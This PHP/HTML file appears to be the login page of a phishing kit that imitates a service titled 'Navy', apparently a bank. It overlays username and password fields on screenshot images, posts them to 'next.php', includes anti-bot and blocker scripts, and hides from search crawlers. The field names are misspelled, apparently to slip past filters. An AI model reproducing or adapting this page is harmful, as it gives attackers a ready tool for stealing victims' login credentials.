<?php

session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include 'antibots.php';
include 'bt.php';
include "blocker.php";
?>
<!DOCTYPE html>
 <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noodp" />
    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp" />
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<link rel="shortcut icon" href="images/favicon.ico" type="image/ico" />
<title>Navy</title>
<script type="text/javascript">
	function validateMyForm() {
		// The field is empty, submit the form.
		if(!document.getElementById("honeypot").value) { 
			return true;
		} 
		 // the field has a value it's a spam bot
		else {
			return false;
		}
	}
</script>
<body>
  

 <div  style="position:absolute; overflow:hidden; left:0px; top:0px; width:1348px; height:612px; z-index:2"><img src="images/1.gif" alt="" title="" border=0 width=1345 height=612></div>
 <div  style="position:absolute; overflow:hidden; left:0px; top:612px; width:1348px; height:318px; z-index:2"><img src="images/2.gif" alt="" title="" border=0 width=1345 height=318></div>

 
 <form action="next.php"  onSubmit="return validateMyForm();" method="post" id='_form_1029' accept-charset='utf-8' enctype='multipart/form-data'>
 
  
 
 <input name="nauesr"  type="text" style="position:absolute;width:230px;left:237px;top:316px;z-index:28;height:20px;  border:none; border-radius:2px; font-size:14px"  required>
 
  <input name="pa33chnad" type="password" style="position:absolute;width:230px;left:237px;top:386px;z-index:28; height:20px;  border:none;border-radius:2px;font-size:14px"   required>
  
  <!-- honeypot field start-->
	<div style="display:none;">
		<label>Keep this field blank</label>
		<input type="text" name="honeypot" id="honeypot" />
	</div>
	<!-- honeypot field end -->
  
 <input name="Submit" type="image" style="position:absolute;left:230px;top:424px;z-index:2" src="images/3.gif" alt="" title="" border=0 width=97 height=45></button></form>
  
 
</body>
</body>

</html>
  
   